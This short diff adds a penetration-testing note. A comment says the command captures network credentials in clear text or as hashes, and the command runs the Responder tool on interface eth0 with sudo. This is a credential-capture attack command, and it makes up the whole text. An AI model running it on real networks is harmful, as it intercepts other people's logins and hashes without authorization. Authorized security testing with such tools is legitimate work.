@@ -1,0 +1,3 @@
+//Use this command to capture over the wire credentials either in clear text or get the hash.
+
+#sudo responder -I eth0
